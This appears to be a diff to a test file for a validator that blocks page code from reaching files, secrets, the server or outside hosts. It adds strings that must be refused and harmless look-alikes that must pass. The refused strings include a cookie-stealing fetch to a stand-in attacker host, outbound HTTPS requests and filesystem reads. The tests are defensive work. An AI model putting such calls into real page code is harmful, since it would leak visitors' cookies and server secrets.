@@ -96,6 +96,10 @@ try {
     '"use server"', "globalThis.process", "navigator.sendBeacon('https://x.test', d)", "<script src=x></script>", "dangerouslySetInnerHTML={{ __html: x }}", "${{ secrets.TOKEN }}", "os.environ['X']", "getenv('X')", 'import "server-only"',
     "new WebSocket('https://x.test')", "const p = process;", "leak(process)"];
   check("nor reach for settings, files, the server or the outside world, however it is spelled", badText.filter((x) => !refuse(["app/page.tsx"], x)).length === 0, badText.filter((x) => !refuse(["app/page.tsx"], x)));
+  const moreBad = ['Function("return this")()', "const fs = require(`fs`); fs.readSync(fs.openSync(p), b)", 'require("https").request({ host: h })', 'import os from "node:os"', 'fetch("//evil.example/?" + document.cookie)', "await import(`node:http`)"];
+  check("four more spellings of the same reaching are refused too", moreBad.filter((x) => !refuse(["app/page.tsx"], x)).length === 0, moreBad.filter((x) => !refuse(["app/page.tsx"], x)));
+  const stillOk = ['if (link.startsWith("http")) open(link)', "<a href=\"https://example.test\">Our site</a>", "const os = platform === 'mac' ? 'macOS' : 'Windows';", "type Handler = Function;", "function Page() {}", "fetch(`/api/slots?day=${day}`)", "a // b"];
+  check("and words that only look like them are still let through", stillOk.filter((x) => refuse(["app/page.tsx"], x)).length === 0, stillOk.filter((x) => refuse(["app/page.tsx"], x)));
   const okText = ["We process your booking in a moment.", "The process is simple. Next, pick a time.", "Our process, step by step", "<p>Choose an environment that suits you.</p>", "const total = items.length;", "fetch('/api/bookings')",
     "background: green; font-size: 20px;", "export default function Page() { return <main>Good morning</main>; }", "Read the file you were sent.", "the key to a good booking", "(process)"];
   check("ordinary pages and ordinary words are let through", okText.filter((x) => refuse(["app/page.tsx"], x) && x !== "(process)").length === 0, okText.filter((x) => refuse(["app/page.tsx"], x)));
